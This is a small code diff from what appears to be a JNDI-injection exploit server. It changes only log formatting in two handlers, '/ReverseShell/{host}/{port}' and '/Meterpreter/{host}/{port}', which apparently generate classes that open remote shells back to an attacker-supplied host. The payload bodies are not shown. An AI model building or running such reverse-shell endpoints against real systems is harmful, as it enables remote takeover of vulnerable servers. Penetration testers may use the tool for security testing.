@@ -90,7 +90,7 @@ public class BasicController implements Controller {
 
     @JNDIMapping("/ReverseShell/{host}/{port}")
     public byte[] reverseShell(String host, String port) throws Exception {
-        System.out.println("[ReverseShell]: Host: " + host + " Port: " + port);
+        System.out.println("[ReverseShell] Host: " + host + " Port: " + port);
 
         String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
@@ -105,7 +105,7 @@ public class BasicController implements Controller {
 
     @JNDIMapping("/Meterpreter/{host}/{port}")
     public byte[] meterpreter(String host, String port) throws Exception {
-        System.out.println("[Meterpreter]: Host: " + host + " Port: " + port);
+        System.out.println("[Meterpreter] Host: " + host + " Port: " + port);
 
         String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
